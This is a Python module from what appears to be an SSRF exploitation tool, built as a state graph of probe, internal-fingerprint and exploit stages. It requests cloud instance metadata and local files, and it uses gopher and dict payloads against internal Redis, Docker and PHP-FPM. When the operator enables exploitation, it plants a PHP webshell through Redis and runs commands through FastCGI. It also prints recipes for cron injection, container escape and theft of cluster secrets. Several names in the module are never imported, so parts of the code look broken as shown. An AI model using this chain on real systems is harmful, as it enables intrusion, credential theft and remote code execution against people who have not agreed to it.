"""The SSRF state graph.

    probe ------> services ------> exploit
      |                              ^
      +-----> internal --------------+

`probe` asks whether the input reaches a fetcher at all, and does it with the
cheapest conclusive evidence first: cloud metadata (no listener needed), then a
callback the target must call back. `internal` uses a confirmed fetch to look
for services only reachable from the target's own network. `exploit` turns a
fingerprinted service into something actionable.

Every step writes what it learned to the blackboard, so the state that follows
starts from knowledge rather than from scratch.
"""

from __future__ import annotations

from urllib.parse import urlsplit

from ...core.mutate import Kind
from ...core.protocols import gopher_http
from ...engine.blackboard import Confidence
from ...engine.inject import (
    candidates as _candidates,
    inject as _inject,
    inject_escalating as _inject_escalating,
    note_finding as _emit_finding,
    payload_scope as _scope,
    rebind_seeds as _probe_seeds,
    record as _record,
    route_via as _route_via,
    scheme as _scheme,
    template as _template,
)
from ...engine.statemachine import Action, RunContext, State, StateGraph, Transition
from .exploits import DEFAULT_SHELL_NAME, php_webshell, phpfpm_execute, redis_write_file
from .seeds import (
    CALLBACK_SEEDS,
    DIAGNOSTIC_MARKERS,
    FILE_PROBES,
    INTERNAL_PROBES,
    METADATA_HEADER_PROBES,
    METADATA_PROBES,
    fastcgi_probe,
)

FINDINGS = "ssrf.findings"
SERVICES = "ssrf.services"
SCHEMES = "ssrf.schemes"
CHANNEL = "ssrf.channel"
REACHED = "ssrf.fetch.confirmed"


# --------------------------------------------------------------------- helpers


def _note_finding(ctx: RunContext, entry: dict) -> None:
    """Record a finding under this module's key."""
    _emit_finding(ctx, FINDINGS, entry)


def _kind(name: str) -> Kind:
    try:
        return Kind(name)
    except ValueError:
        return Kind.SSRF


def _try_probes(ctx: RunContext, probes, action: str, family: str) -> bool:
    """Send each probe through every candidate parameter until one is conclusive."""
    found = False
    for param in _candidates(ctx):
        for probe in probes:
            for seed in _probe_seeds(ctx, probe.payload):
                outcome = _inject_escalating(ctx, param, seed, action, kind=_kind(probe.kind))
                if outcome is None:
                    continue
                request, exchange, variant = outcome
                if exchange.response.error:
                    continue
                verdict = ctx.judge.signature(exchange.response, probe.signatures, variant.value)
                if not verdict.confirmed:
                    continue
                found = True
                if ctx.pheromone is not None:
                    ctx.pheromone.reward(_scope(probe.payload), variant.mutators, amount=1.0)
                ctx.blackboard.set(
                    REACHED,
                    True,
                    evidence=f"{probe.name} was fetched through {param.key()}",
                    confidence=Confidence.CONFIRMED,
                )
                ctx.blackboard.set(
                    "ssrf.rebind",
                    seed != probe.payload,
                    evidence="the destination had to be a name that alternates"
                    if seed != probe.payload
                    else "a plain address was enough",
                    confidence=Confidence.LIKELY,
                )
                _record(ctx, SCHEMES, probe.payload.split(":", 1)[0], evidence=probe.name, confidence=Confidence.CONFIRMED)
                _note_finding(
                    ctx,
                    {
                        "name": probe.name,
                        "param": param.key(),
                        "payload": variant.value,
                        "generation": variant.generation,
                        "request": request.to_bytes().decode("latin-1"),
                        "evidence": verdict.reason,
                        "detail": verdict.detail,
                        "family": family,
                        "rebinding": seed != probe.payload,
                    },
                )
                return True
    return found


# --------------------------------------------------------------------- actions


def probe_metadata(ctx: RunContext) -> None:
    """Ask for a cloud instance's metadata. No listener required."""
    if _try_probes(ctx, METADATA_PROBES, "probe.metadata", "metadata"):
        ctx.blackboard.set("ssrf.impact", "cloud credentials", evidence="instance metadata was reachable", confidence=Confidence.CONFIRMED)


def probe_file(ctx: RunContext) -> None:
    """Ask a fetch to read a local file, directly or through a wrapper."""
    _try_probes(ctx, FILE_PROBES, "probe.file", "file")


def probe_callback(ctx: RunContext) -> None:
    """Plant a callback and wait for the target to call home.

    This is the only way to prove a blind fetch: the response to the triggering
    request says nothing, and the proof arrives on another connection.
    """
    if ctx.oob is None or not getattr(ctx.oob, "running", False):
        ctx.blackboard.mark_not_covered(
            "probe.callback", "no listener was given, so the callback probes were skipped"
        )
        return

    wait = min(float(ctx.config.get("oob_wait", 5.0)), 5.0)
    for param in _candidates(ctx)[:2]:
        for seed in CALLBACK_SEEDS[:8]:
            issued, token = ctx.oob.new_url(f"{param.key()}:{seed}")
            host = urlsplit(issued).netloc
            payload = seed.format(url=issued, host=host, token=token)
            request, exchange = _inject(ctx, param, payload, "probe.callback")
            variant = None
            if ctx.last_refused:
                # The spelling was refused, so a variant of the same callback is
                # worth one more try before the seed is written off.
                outcome = _inject_escalating(ctx, param, payload, "probe.callback", per_generation=3)
                if outcome:
                    request, exchange, variant = outcome
            if exchange.response.error:
                continue
            interactions = ctx.oob.wait(token, timeout=wait)
            if interactions:
                if ctx.pheromone is not None and variant is not None:
                    ctx.pheromone.reward(_scope(payload), variant.mutators, amount=1.0)
                ctx.blackboard.set(
                    REACHED,
                    True,
                    evidence=f"callback {token} reached the listener from {interactions[0].remote_addr}",
                    confidence=Confidence.CONFIRMED,
                )
                ctx.blackboard.set(
                    "ssrf.oob.origin",
                    interactions[0].remote_addr,
                    evidence=interactions[0].describe(),
                    confidence=Confidence.CONFIRMED,
                )
                _note_finding(
                    ctx,
                    {
                        "name": "ssrf-blind",
                        "param": param.key(),
                        "payload": payload,
                        "request": request.to_bytes().decode("latin-1"),
                        "evidence": interactions[0].describe(),
                        "family": "callback",
                    },
                )
                return
            if ctx.stopped:
                return


def probe_metadata_headers(ctx: RunContext) -> None:
    """Reach a metadata service that refuses a request without its header.

    A URL parameter cannot add a header, so these services answer 403 to every
    spelling of their address. Writing the request over gopher is what makes
    them reachable - and reaching them is the whole difference between "the
    instance is unreadable" and "here are its project and hostname".
    """
    for param in _candidates(ctx):
        for probe in METADATA_HEADER_PROBES:
            payload = gopher_http(probe.host, probe.port, probe.path, headers=probe.headers)
            outcome = _inject_escalating(
                ctx, param, payload, "probe.metadata.headers", kind=Kind.PROTOCOL, per_generation=4
            )
            if outcome is None or ctx.stopped:
                continue
            request, exchange, variant = outcome
            verdict = ctx.judge.signature(exchange.response, probe.signatures, variant.value)
            if not verdict.confirmed:
                continue
            _note_finding(
                ctx,
                {
                    "name": probe.name,
                    "param": param.key(),
                    "payload": variant.value,
                    "generation": variant.generation,
                    "request": request.to_bytes().decode("latin-1"),
                    "evidence": verdict.reason,
                    "detail": probe.note,
                    "family": "metadata-header",
                },
            )
            ctx.blackboard.set(
                "ssrf.metadata.headers",
                probe.name,
                evidence=f"the request had to carry {probe.headers[0][0]}",
                confidence=Confidence.CONFIRMED,
            )
            return


HOST_PARAM_HINTS = ("host", "ip", "addr", "domain", "server", "dest", "target")
PATH_PARAM_HINTS = ("path", "uri", "file", "dir", "route", "page", "endpoint")


def probe_split(ctx: RunContext) -> None:
    """When the destination is assembled from two parameters.

    An application that takes a host and a path separately is not reachable by
    filling in either one: the value has to be split, and only then does the
    assembled URL point anywhere. The parameters are guessed from their names,
    which is enough to test the shape - and if nothing comes back, the guess was
    wrong and nothing is claimed.
    """
    if ctx.blackboard.get("ssrf.split.confirmed"):
        return
    params = _candidates(ctx)
    if len(params) < 2:
        return

    host_param = _pick_param(params, HOST_PARAM_HINTS)
    path_param = _pick_param(params, PATH_PARAM_HINTS, exclude=host_param)
    if host_param is None or path_param is None:
        return

    attempts = (
        ("split-metadata", "169.254.169.254", "/latest/meta-data/", ("ami-id", "instance-id", "local-hostname")),
        ("split-redis", "gopher://127.0.0.1:6379", "/_PING%0d%0a", ("+PONG",)),
        ("split-docker", "http://127.0.0.1:2375", "/version", ("apiversion", "gitcommit")),
    )
    for name, host_value, path_value, signatures in attempts:
        if ctx.stopped:
            return
        base = rewrite(_template(ctx), host_param, host_value, Encode.URL)
        request = rewrite(base, path_param, path_value, Encode.URL)
        exchange = ctx.send(request, action="probe.split")
        if exchange.response.error:
            continue
        verdict = ctx.judge.signature(exchange.response, signatures, path_value)
        if not verdict.confirmed:
            continue
        ctx.blackboard.set(
            REACHED,
            True,
            evidence=f"{name}: the destination is assembled from {host_param.key()} and {path_param.key()}",
            confidence=Confidence.CONFIRMED,
        )
        ctx.blackboard.set(
            "ssrf.split.confirmed",
            f"{host_param.key()}+{path_param.key()}",
            evidence=f"{name} answered only once both parameters were filled",
            confidence=Confidence.CONFIRMED,
        )
        _note_finding(
            ctx,
            {
                "name": name,
                "param": f"{host_param.key()} + {path_param.key()}",
                "payload": f"{host_value}{path_value}",
                "generation": 0,
                "request": request.to_bytes().decode("latin-1"),
                "evidence": verdict.reason,
                "family": "split",
            },
        )
        return


def _pick_param(params: list[Param], hints: tuple[str, ...], exclude: Param | None = None) -> Param | None:
    for param in params:
        if exclude is not None and param.key() == exclude.key():
            continue
        name = param.name.lower()
        if any(hint in name for hint in hints):
            return param
    return None


def probe_redirect(ctx: RunContext) -> None:
    """Reach the destination through a redirect we control.

    An application that follows a redirect is an application whose second hop is
    chosen by whoever answered the first one. The listener answers 302 and names
    a destination the caller was not allowed to name directly - which is the
    whole mechanism behind a whitelist plus an open redirect, and the only way
    past a filter that never looks at where the redirect goes.

    What is proved here is that the target walks the chain on its own: the
    second request arrives at a name it could only have learned from our
    Location header.
    """
    oob = ctx.oob
    if oob is None or not getattr(oob, "running", False) or not hasattr(oob, "new_redirect"):
        ctx.blackboard.mark_not_covered(
            "probe.redirect", "no listener was given, so the redirect probe was skipped"
        )
        return

    for param in _candidates(ctx):
        if ctx.stopped:
            return
        landed_url, landed_token = oob.new_url(f"landed:{param.key()}")
        entry_url, _ = oob.new_redirect(landed_url, label=param.key())
        request, exchange = _inject(ctx, param, entry_url, "probe.redirect")
        if exchange.response.error:
            continue
        hits = oob.wait(landed_token, timeout=float(ctx.config.get("oob_wait", 5.0)))
        if not hits:
            continue

        ctx.blackboard.set(
            "ssrf.follows_redirects",
            True,
            evidence=f"the target followed our 302 and asked for {landed_url}",
            confidence=Confidence.CONFIRMED,
        )
        _note_finding(
            ctx,
            {
                "name": "ssrf-follows-redirect",
                "param": param.key(),
                "payload": entry_url,
                "generation": 0,
                "request": request.to_bytes().decode("latin-1"),
                "evidence": "the target requested the destination we named in the Location header",
                "family": "redirect",
            },
        )
        return


def probe_diagnostics(ctx: RunContext) -> None:
    """Look for the target telling us it tried: a fetch error names the input.

    Not a finding on its own - a page that validates a URL also complains - but
    it is evidence the parameter reaches a fetcher, which is what lets the later
    states know the input surface is real.
    """
    if ctx.blackboard.get(REACHED):
        return
    marker = "http://injectorkit.invalid/"
    for param in _candidates(ctx):
        _, exchange = _inject(ctx, param, marker, "probe.diagnostics")
        body = exchange.response.text.lower()
        for phrase in DIAGNOSTIC_MARKERS:
            if phrase in body and "injectorkit.invalid" in body:
                ctx.blackboard.set(
                    REACHED,
                    True,
                    evidence=f"the target reported a fetch error for our marker through {param.key()}",
                    confidence=Confidence.LIKELY,
                )
                return


def classify_channel(ctx: RunContext) -> None:
    """Decide how this target reports back, which every later step depends on."""
    if ctx.blackboard.get("ssrf.oob.origin"):
        channel = "out-of-band"
    elif ctx.blackboard.get(FINDINGS):
        channel = "in-band"
    elif ctx.blackboard.get(REACHED):
        channel = "error-based"
    else:
        channel = "none"
    ctx.blackboard.set(CHANNEL, channel, evidence="classified from what the probes proved", confidence=Confidence.LIKELY)
    ctx.info(f"  response channel: {channel}")


def scheme_matrix(ctx: RunContext) -> None:
    """Which schemes this input accepts, one conclusive probe each."""
    accepted = ctx.blackboard.get(SCHEMES) or []
    seen = {str(item) for item in accepted}
    payloads = (
        ("file", "file:///etc/passwd", FILE_PROBES[0].signatures),
        ("gopher", "gopher://127.0.0.1:6379/_PING%0d%0a", ("+PONG",)),
        ("dict", "dict://127.0.0.1:6379/PING", ("+PONG", "PONG")),
        ("http", "http://127.0.0.1:80/", ("it works",)),
    )
    for name, payload, signatures in payloads:
        if name in seen or ctx.stopped:
            continue
        if name == "http":
            continue
        for param in _candidates(ctx):
            # Through the escalating path, so a filter that refuses the value
            # still gets the second-occurrence attempt before this is called a
            # dead end.
            outcome = _inject_escalating(ctx, param, payload, "scheme.matrix")
            if outcome is None:
                continue
            _, exchange, _ = outcome
            if ctx.judge.signature(exchange.response, signatures, payload).confirmed:
                _record(ctx, SCHEMES, name, evidence=f"{name} reached a service through {param.key()}", confidence=Confidence.CONFIRMED)
                seen.add(name)
                break


def fingerprint_services(ctx: RunContext) -> None:
    """Fingerprint services only reachable from inside the target's network."""
    if not ctx.blackboard.get(REACHED) and not ctx.blackboard.get(SCHEMES):
        ctx.blackboard.mark_dead_end("internal.fingerprint", "no confirmed fetch to work from")
        return

    for param in _candidates(ctx):
        probes = list(INTERNAL_PROBES) + [fastcgi_probe(int(ctx.config.get("fpm_port", 9000)))]
        for probe in probes:
            if ctx.stopped:
                return
            outcome = _inject_escalating(ctx, param, probe.payload, "internal.fingerprint", kind=_kind(probe.kind))
            if outcome is None:
                continue
            request, exchange, variant = outcome
            verdict = ctx.judge.signature(exchange.response, probe.signatures, variant.value)
            if not verdict.confirmed:
                continue
            if ctx.pheromone is not None:
                ctx.pheromone.reward(_scope(probe.payload), variant.mutators, amount=1.0)
            entry = {
                "service": probe.name.split("-")[0],
                "probe": probe.name,
                "param": param.key(),
                "payload": variant.value,
                "generation": variant.generation,
                "request": request.to_bytes().decode("latin-1"),
                "evidence": verdict.reason,
                "note": probe.note,
            }
            _record(ctx, SERVICES, entry, evidence=verdict.reason, confidence=Confidence.CONFIRMED)
            ctx.blackboard.set(
                f"service.{entry['service']}",
                probe.payload,
                evidence=f"{probe.name} answered: {verdict.reason}",
                confidence=Confidence.CONFIRMED,
            )
            ctx.emit(f"  [!] internal service fingerprinted: {probe.name} ({probe.note})")


def choose_exploit(ctx: RunContext) -> None:
    """Turn a fingerprinted service into the next concrete step.

    Nothing is written to a target here. What the state produces is the verified
    entry point plus the follow-up command, so a later run (or a user) continues
    from a known-good primitive instead of repeating the reconnaissance.
    """
    services = ctx.blackboard.get(SERVICES) or []
    if not services:
        return
    names = {entry.get("service") for entry in services if isinstance(entry, dict)}
    recipes: list[tuple[str, str]] = []
    if "redis" in names:
        recipes.append(
            (
                "redis",
                "write a file through CONFIG SET dir/dbfilename, or a cron entry with "
                "CONFIG SET dir /var/spool/cron && SET x \"\\n* * * * * <command>\\n\" && SAVE",
            )
        )
    if "memcached" in names:
        recipes.append(("memcached", "no file primitive; use it to reach the internal network or poison a cache"))
    if "docker" in names:
        recipes.append(("docker", "POST /containers/create with a bind mount of / to escape the container"))
    if "etcd" in names or "kubelet" in names:
        recipes.append(("cluster", "read secrets from the control plane (etcd /v2/keys, kubelet /pods)"))
    if "fastcgi" in names:
        recipes.append(("fastcgi", "gopher a PHP-FPM record pair: set PHP_VALUE auto_prepend_file to run code"))
    if not recipes:
        return
    ctx.blackboard.set(
        "ssrf.exploitable",
        [name for name, _ in recipes],
        evidence="a fingerprinted service accepts the fetch primitive",
        confidence=Confidence.CONFIRMED,
    )
    for name, recipe in recipes:
        ctx.emit(f"  [>] next step for {name}: {recipe}")
        ctx.blackboard.set(f"ssrf.recipe.{name}", recipe, evidence="derived from the fingerprint", confidence=Confidence.LIKELY)


def _application_base(ctx: RunContext) -> str:
    """The scheme and authority of the target application, for verification."""
    parts = urlsplit(_template(ctx).url)
    return f"{parts.scheme}://{parts.netloc}"


def exploit_services(ctx: RunContext) -> None:
    """Act on what was fingerprinted, when the operator asked for it.

    Nothing here runs by default. Writing a file or running a command on a
    target is a decision the operator makes; a tool that makes it for them is
    one nobody should point at a live system.
    """
    if not ctx.config.get("exploit"):
        ctx.info("  exploitation is off; pass --exploit to act on what was fingerprinted")
        return

    names = {
        entry.get("service")
        for entry in (ctx.blackboard.get(SERVICES) or [])
        if isinstance(entry, dict)
    }
    if not names:
        return

    base = _application_base(ctx)
    if "redis" in names:
        _exploit_redis(ctx, base)
    if "fastcgi" in names:
        _exploit_phpfpm(ctx)


def _exploit_redis(ctx: RunContext, base: str) -> None:
    webroot = ctx.config.get("webroot")
    shell_name = ctx.config.get("shell_name") or DEFAULT_SHELL_NAME
    if not webroot:
        ctx.info("  redis answers; pass --webroot to write a file through its persistence path")
        return
    payload = redis_write_file("127.0.0.1", 6379, webroot, shell_name, php_webshell())
    _send_exploit(ctx, payload, "redis-webshell", verify_url=f"{base}/{shell_name}?c=id")


def _exploit_phpfpm(ctx: RunContext) -> None:
    script = ctx.config.get("fpm_script")
    if not script:
        ctx.info("  php-fpm answers; pass --fpm-script with a path that exists on the target")
        return
    payload = phpfpm_execute(
        "127.0.0.1",
        int(ctx.config.get("fpm_port", 9000)),
        script,
        "<?php system('id'); ?>",
    )
    # The FastCGI reply carries the script's output, so the proof is in the
    # response itself rather than in a second request.
    _send_exploit(ctx, payload, "phpfpm-exec", verify_url=None, expect=("uid=",))


def _send_exploit(
    ctx: RunContext,
    payload: str,
    name: str,
    verify_url: str | None = None,
    expect: tuple[str, ...] = (),
) -> None:
    for param in _candidates(ctx):
        if ctx.stopped:
            return
        outcome = _inject_escalating(ctx, param, payload, f"exploit.{name}", kind=Kind.PROTOCOL, per_generation=3)
        if outcome is None:
            continue
        request, exchange, variant = outcome
        if ctx.last_refused:
            continue

        # A service that refuses the payload says so in its reply, and the reply
        # is worth reading: "protected config" is not a failed request, it is a
        # target that has been hardened, and reporting it as success would be
        # the kind of lie that makes a tool untrustworthy.
        reply = exchange.response.text
        refusal = _service_refusal(reply)
        if refusal:
            ctx.emit(f"  [!] {name}: the service refused the payload ({refusal})")
            ctx.blackboard.set(
                f"ssrf.exploit.{name}.refused",
                refusal,
                evidence=reply[:200],
                confidence=Confidence.CONFIRMED,
            )
            ctx.blackboard.mark_dead_end(f"exploit.{name}", f"service refused: {refusal}")
            return

        for marker in expect:
            if marker in reply:
                ctx.blackboard.set(
                    f"ssrf.execution.{name}",
                    True,
                    evidence=f"the reply carries the output: {marker}",
                    confidence=Confidence.CONFIRMED,
                )
                ctx.emit(f"  [+] {name}: command execution confirmed")
                return

        ctx.blackboard.set(
            f"ssrf.exploit.{name}",
            variant.value,
            evidence=f"the payload reached the service through {param.key()}",
            confidence=Confidence.LIKELY,
        )
        ctx.emit(f"  [>] {name}: payload sent through {param.key()}")
        if verify_url:
            _verify_execution(ctx, verify_url, name)
        elif expect:
            ctx.emit(f"  [!] {name}: the payload was accepted but the reply carries no proof of execution")
        return


def _service_refusal(reply: str) -> str:
    """The service's own words, when it rejected the payload."""
    if not reply:
        return ""
    lowered = reply.lower()
    for marker in ("-err", "protected config", "noauth", "wrongpass", "denied", "noperm"):
        if marker in lowered:
            first = reply.splitlines()[0]
            return first[:160]
    return ""


def _verify_execution(ctx: RunContext, url: str, name: str) -> None:
    exchange = ctx.send(Request.from_url(url), action=f"exploit.{name}.verify")
    body = exchange.response.text
    if "uid=" in body:
        ctx.blackboard.set(
            f"ssrf.execution.{name}",
            True,
            evidence="the command ran: " + body[:120].replace("\n", " "),
            confidence=Confidence.CONFIRMED,
        )
        ctx.emit(f"  [+] {name}: command execution confirmed")
    else:
        ctx.emit(f"  [!] {name}: the payload was accepted but the follow-up request did not prove execution")


def confirm_execution(ctx: RunContext) -> None:
    """State what the run proved - and what it could not reach."""
    # An action that never ran because a condition was missing is not a result,
    # and a summary that leaves it out reads as "tested and clean" when it means
    # "never tested".
    if not ctx.config.get("exploit"):
        ctx.blackboard.mark_not_covered(
            "exploit.services", "not requested; pass --exploit to act on what was fingerprinted"
        )

    proven = ctx.blackboard.get("ssrf.exploitable")
    if proven:
        ctx.emit("  result: the fetch primitive reaches " + ", ".join(str(item) for item in proven))
    else:
        ctx.emit("  result: no exploitable internal service was confirmed")

    # Silence and refusal look the same from outside, so say which one this was.
    refusals = ctx.bypass.refusals()
    if not refusals:
        return
    ctx.emit(f"  filter: {refusals} requests were refused")
    closed = ctx.bypass.blocked_families()
    for scope, count in sorted(closed.items()):
        ctx.emit(f"    closed on this target: {scope} ({count} rewrites refused)")
    if not proven:
        ctx.emit("    nothing was reached because the input surface is filtered, not because it is clean")


# ----------------------------------------------------------------- graph shape


def build_graph(name: str = "ssrf") -> StateGraph:
    """Assemble the SSRF graph. Names are stable; they appear in session files."""
    graph = StateGraph(name=name, start="probe")

    graph.add(
        State(
            name="probe",
            description="does the input reach a fetcher, and how does it answer",
            actions=[
                Action("probe.metadata", "ask for cloud instance metadata", probe_metadata),
                Action("probe.metadata.headers", "ask again, with the header it demands", probe_metadata_headers),
                Action("probe.file", "ask a fetch to read a local file", probe_file),
                Action("probe.callback", "plant a callback and wait for it", probe_callback),
                Action("probe.redirect", "answer a redirect and see where the target goes", probe_redirect),
                Action("probe.diagnostics", "look for fetch errors that name our input", probe_diagnostics),
                Action("probe.split", "when host and path are separate parameters", probe_split),
                Action("probe.channel", "classify the response channel", classify_channel),
            ],
            transitions=[
                Transition("exploit", lambda ctx: bool(ctx.blackboard.get("ssrf.exploitable")), "a service was already reachable"),
                Transition("internal", lambda ctx: bool(ctx.blackboard.get(REACHED) or ctx.blackboard.get(SCHEMES)), "the fetch primitive works"),
                Transition("finish", lambda ctx: True, "nothing proved the input is fetched"),
            ],
        )
    )
    graph.add(
        State(
            name="internal",
            description="fingerprint services on the target's own network",
            actions=[
                Action("scheme.matrix", "which wrappers this input accepts", scheme_matrix),
                Action("internal.fingerprint", "fingerprint internal services", fingerprint_services),
            ],
            transitions=[
                Transition("exploit", lambda ctx: bool(ctx.blackboard.get(SERVICES)), "a service answered"),
                Transition("finish", lambda ctx: True, "nothing internal answered"),
            ],
        )
    )
    graph.add(
        State(
            name="exploit",
            description="turn a fingerprinted service into the next step",
            actions=[
                Action("exploit.services", "act on what was fingerprinted", exploit_services),
                Action("exploit.choose", "choose the follow-up for what was found", choose_exploit),
            ],
            transitions=[Transition("finish", lambda ctx: True, "done")],
        )
    )
    graph.add(
        State(
            name="finish",
            description="summarise what the run proved",
            actions=[Action("report.summary", "print the result", confirm_execution)],
        )
    )
    return graph
